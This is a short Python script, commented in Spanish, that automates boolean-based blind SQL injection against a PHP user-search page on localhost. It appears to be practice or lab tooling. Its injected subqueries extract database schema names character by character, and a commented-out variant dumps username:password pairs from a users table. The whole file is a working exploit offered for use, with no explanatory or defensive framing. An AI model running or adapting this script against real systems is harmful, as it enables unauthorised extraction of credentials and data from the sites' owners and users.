# script de fuerza bruta para la enumeracion de usuarios:contraseña por boolean based blind sql injection
# para querys sanitizadas sobre un servidor apache2

import requests
from pwn import *
import string
import time 
import signal
import sys

def ctrl_c(sig,frame):
    print('\n\ninterrupcion. saliendo')
    sys.exit(1)

def main():

    # definicion de barra de progreso 1
    p1= log.progress("Fuzzing")
    p1.status("Iniciando proceso de fuzzing")

    time.sleep(1)

    # definicion de barra de progreso 2
    p2= log.progress("Datos extraidos")
    datos=''


    # i -> posicion en la query | j -> posicion de caracteres en ascii
    for i in range(1,200):
        for j in range(33,126): 
           
            # bd enum
            sqli_url = url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1))=%d" % (i,j)

            # user:password enum
            # sqli_url = url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1))=%d" % (i,j)

            # print(f'\nprobando con {sqli_url}')
            p1.status(f'Probando en la posicion {i} con el caracter ascii {j}')

            r=requests.get(sqli_url)

            if r.status_code==200:
                # caracter=chr(j)
                # print(f'Caracter encontrado: {caracter}')
                datos += chr(j)
                p2.status(datos)
                break

    sys.exit(0)


#Global var
url='http://localhost/searchUsers.php'
caracteres=string.printable

signal.signal(signal.SIGINT, ctrl_c)

if __name__=='__main__':
    # time.sleep(12)
    main()
